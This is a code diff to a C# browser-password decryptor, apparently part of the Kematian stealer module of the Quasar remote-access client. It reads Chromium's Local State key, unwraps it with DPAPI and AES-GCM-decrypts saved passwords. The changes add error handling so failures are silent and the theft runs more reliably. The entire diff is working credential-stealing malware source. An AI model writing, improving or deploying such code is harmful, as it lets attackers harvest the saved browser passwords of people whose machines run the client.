@@ -16,24 +16,33 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
 
         public ChromiumDecryptor(string localStatePath)
         {
-            //try
-            //{
-            if (File.Exists(localStatePath))
+            try
             {
-                string localState = File.ReadAllText(localStatePath);
+                if (File.Exists(localStatePath))
+                {
+                    string localState = File.ReadAllText(localStatePath);
+                    var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
+                    var endIndex = localState.IndexOf('"', startIndex + 1);
+                    var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);
 
-                var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
-                var endIndex = localState.IndexOf('"', startIndex + 1);
-                var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);
-
-                _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
-                    DataProtectionScope.CurrentUser);
+                    try
+                    {
+                        _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
+                            DataProtectionScope.CurrentUser);
+                    }
+                    catch (Exception e)
+                    {
+                        Debug.WriteLine(localStatePath);
+                        Debug.WriteLine(e);
+                        Debug.WriteLine("Failed to decrypt the key. Ensure you have the correct local state file.");
+                        return;
+                    }
+                }
             }
-            //}
-            //catch (Exception e)
-            //{
-            //    Debug.WriteLine(e);
-            //}
+            catch (Exception e)
+            {
+                Debug.WriteLine(e);
+            }
         }
 
         public string Decrypt(string cipherText)
@@ -44,7 +53,6 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
                     return "";
 
                 var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
-
                 var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
                 var encryptedData = cipherTextBytes.Skip(15).ToArray();
 
@@ -53,6 +61,8 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
                 var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();
 
                 var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);
+                if (decryptedPassword == null || decryptedPassword.Length == 0)
+                    return "";
 
                 return Encoding.UTF8.GetString(decryptedPassword);
             }
@@ -68,9 +78,16 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
             const int KEY_BIT_SIZE = 256;
 
             if (key == null || key.Length != KEY_BIT_SIZE / 8)
-                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
+            {
+                Debug.WriteLine("Key is null or invalid length!");
+                return null;
+            }
+
             if (encryptedPassword == null || encryptedPassword.Length == 0)
-                throw new ArgumentException("Message required!", nameof(encryptedPassword));
+            {
+                Debug.WriteLine("Encrypted password is empty!");
+                return null;
+            }
 
             AesGcmBetter AES = new AesGcmBetter();
             var output = new byte[0];
@@ -79,13 +96,25 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
             {
                 output = AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
             }
+            catch (CryptographicException e)
+            {
+                if (e.Message.Contains("authentication tag mismatch"))
+                {
+                    Debug.WriteLine("Authentication tag mismatch. Decryption failed.");
+                }
+                else
+                {
+                    Debug.WriteLine(e);
+                }
+                return null;
+            }
             catch (Exception e)
             {
                 Debug.WriteLine(e);
                 return null;
             }
+
             return output;
         }
     }
 }
-
